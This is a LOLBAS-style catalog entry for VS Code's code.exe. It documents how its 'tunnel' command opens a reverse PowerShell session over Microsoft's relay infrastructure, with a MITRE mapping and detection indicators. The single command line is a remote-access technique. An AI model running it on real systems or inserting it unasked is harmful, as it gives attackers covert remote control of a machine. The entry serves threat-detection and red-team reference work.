---
Author: PfiatDe
Commands:
- Category: Execute
  Command: code.exe tunnel --accept-server-license-terms --name "tunnel-name"
  Description: Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com
    via websockets; command
  MitreID: T1219.001
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Reverse PowerShell session over MS provided infrastructure.
Created: 2023-02-01
Description: VSCode binary, also portable (CLI) version
Detection:
- IOC: Websocket traffic to global.rel.tunnels.api.visualstudio.com
- IOC: 'Process tree: code.exe -> cmd.exe -> node.exe -> winpty-agent.exe'
- IOC: 'File write of code_tunnel.json which is parametizable, but defaults to: %UserProfile%\.vscode-cli\code_tunnel.json'
Full_Path:
- Path: C:\Users\<username>\AppData\Local\Programs\Microsoft VS Code\Code.exe
- Path: C:\Program Files\Microsoft VS Code\Code.exe
- Path: C:\Program Files (x86)\Microsoft VS Code\Code.exe
Name: code.exe
Resources:
- Link: https://badoption.eu/blog/2023/01/31/code_c2.html
- Link: https://code.visualstudio.com/docs/remote/tunnels
- Link: https://code.visualstudio.com/blogs/2022/12/07/remote-even-bet
mitre_data:
  technique_ids:
  - T1219.001
tags:
- lolbas/honorablementions
---

# code.exe

VSCode binary, also portable (CLI) version

# Path(s)

- `C:\Users\<username>\AppData\Local\Programs\Microsoft VS Code\Code.exe`
- `C:\Program Files\Microsoft VS Code\Code.exe`
- `C:\Program Files (x86)\Microsoft VS Code\Code.exe`

# Execute Commands

Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command

```batch
code.exe tunnel --accept-server-license-terms --name "tunnel-name"
```

- **Usecase:** Reverse PowerShell session over MS provided infrastructure.
- **Privileges Required:** User
- **MitreID:** `T1219.001`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://badoption.eu/blog/2023/01/31/code_c2.html
- https://code.visualstudio.com/docs/remote/tunnels
- https://code.visualstudio.com/blogs/2022/12/07/remote-even-bet
# Acknowledgements

- PfiatDe (Authored, 2023-02-01)